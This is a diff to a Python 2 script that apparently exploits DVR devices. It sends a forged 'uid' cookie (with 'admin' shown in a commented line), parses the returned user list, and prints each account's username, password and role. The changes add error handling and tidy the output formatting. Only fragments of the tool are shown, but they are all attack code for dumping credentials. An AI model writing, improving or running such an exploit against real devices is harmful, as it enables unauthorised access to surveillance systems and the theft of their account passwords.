@@ -45,6 +45,7 @@ def makeReqHeaders(xCookie):
     headers["Connection"]       = "close"
     headers["Content-Type"]     = "text/html"
     headers["Cookie"]           = "uid="+xCookie
+    
     return headers
 
 try:
@@ -53,8 +54,16 @@ except Exception,e:
     print Colors.RED+" [+] Timed out\n"+Colors.DEFAULT
     exit()
 
-dataJson = json.loads(rX.text)
-totUsr = len(dataJson["list"])   #--> 10
+badJson = rX.text
+try:
+    dataJson = json.loads(badJson)
+    totUsr = len(dataJson["list"])   #--> 10
+except Exception, e:
+    print " [+] Error: "+str(e)
+    print " [>] json: "+str(rX)
+#    print " [>] Reuest: \n"+str(makeReqHeaders(xCookie="admin"))
+    exit()
+
 
 print Colors.GREEN+"\n [+] DVR (url):\t\t"+Colors.ORANGE+str(host)+Colors.GREEN
 print " [+] Port: \t\t"+Colors.ORANGE+str(port)+Colors.DEFAULT
@@ -78,9 +87,9 @@ try:
 
         final_data.append(temp)
 
-        hdUsr = Colors.GREEN+"Username"+Colors.DEFAULT
-        hdPass = Colors.GREEN+"Password"+Colors.DEFAULT
-        hdRole = Colors.GREEN+"Role ID"+Colors.DEFAULT
+        hdUsr  = Colors.GREEN + "Username" + Colors.DEFAULT
+        hdPass = Colors.GREEN + "Password" + Colors.DEFAULT
+        hdRole = Colors.GREEN + "Role ID"  + Colors.DEFAULT
 
         cabeceras = [hdUsr, hdPass, hdRole] 
 
@@ -91,3 +100,4 @@ except Exception, e:
     print " [+] "+ str(dataJson)
 
 print "\n"
+
